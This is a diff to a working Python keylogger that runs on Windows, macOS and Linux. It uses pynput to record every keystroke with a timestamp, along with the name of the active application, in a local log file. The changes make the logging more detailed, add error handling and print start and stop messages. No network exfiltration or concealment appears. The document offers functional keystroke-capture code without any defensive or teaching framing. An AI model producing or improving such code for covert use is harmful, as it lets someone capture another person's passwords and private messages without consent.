@@ -2,7 +2,7 @@ from pynput import keyboard
 import datetime
 import platform
 
-# For Windows
+# Detect OS and import appropriate libraries
 if platform.system() == "Windows":
     import win32gui
     import win32process
@@ -19,16 +19,17 @@ if platform.system() == "Windows":
         except:
             return "Unknown"
 
-# For macOS
 elif platform.system() == "Darwin":
     from AppKit import NSWorkspace
 
 
     def get_active_window():
-        active_app = NSWorkspace.sharedWorkspace().activeApplication()
-        return f"{active_app['NSApplicationName']}"
+        try:
+            active_app = NSWorkspace.sharedWorkspace().activeApplication()
+            return f"{active_app['NSApplicationName']}"
+        except:
+            return "Unknown"
 
-# For Linux
 elif platform.system() == "Linux":
     import subprocess
 
@@ -41,7 +42,8 @@ elif platform.system() == "Linux":
         except:
             return "Unknown"
 
-log_file = "detailed_keylog.txt"
+# Configuration
+log_file = "keylog.txt"
 current_window = ""
 
 
@@ -56,23 +58,38 @@ def on_press(key):
         current_window = active_window
         with open(log_file, "a") as f:
             timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"\n{'=' * 60}\n[{timestamp}] WINDOW CHANGED: {current_window}\n{'=' * 60}\n")
+            f.write(f"\n{'=' * 60}\n")
+            f.write(f"[{timestamp}] APPLICATION: {current_window}\n")
+            f.write(f"{'=' * 60}\n")
 
-    # Log keystroke
+    # Log keystroke with timestamp
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
     try:
+        # Regular character keys
         with open(log_file, "a") as f:
-            f.write(f"{key.char}")
+            f.write(f"[{timestamp}] {key.char}\n")
     except AttributeError:
+        # Special keys
         with open(log_file, "a") as f:
             if key == keyboard.Key.space:
-                f.write(" ")
+                f.write(f"[{timestamp}] [SPACE]\n")
             elif key == keyboard.Key.enter:
-                f.write("\n")
+                f.write(f"[{timestamp}] [ENTER]\n")
             elif key == keyboard.Key.tab:
-                f.write("\t")
+                f.write(f"[{timestamp}] [TAB]\n")
+            elif key == keyboard.Key.backspace:
+                f.write(f"[{timestamp}] [BACKSPACE]\n")
             else:
-                f.write(f" [{key}] ")
+                f.write(f"[{timestamp}] {key}\n")
 
 
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+# Start the listener
+print("Keylogger started. Press Ctrl+C to stop.")
+print(f"Logging to: {log_file}")
+
+try:
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+except KeyboardInterrupt:
+    print("\nKeylogger stopped.")
